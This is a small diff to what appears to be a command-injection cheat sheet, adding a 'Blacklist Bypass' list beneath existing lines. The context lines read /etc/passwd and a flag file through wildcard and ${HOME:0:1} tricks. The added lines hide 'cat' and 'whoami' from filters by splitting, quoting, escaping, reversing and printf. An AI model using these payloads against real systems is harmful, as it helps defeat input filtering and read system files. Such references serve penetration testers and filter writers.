@@ -21,3 +21,9 @@
   - $ cat /f\*
   - $ cat /f?a?
   - $ cat ${HOME:0:1}etc${HOME:0:1}passwd
+- Blacklist Bypass
+  - $ a=ca;b=t;$a$b
+  - $ cat || head || tail || less || more || base64
+  - $ w'h'oami || w"h"oami || \w\h\o\a\m\i
+  - $ $(rev<<<'imaohw')
+  - $ $(printf "whoami")
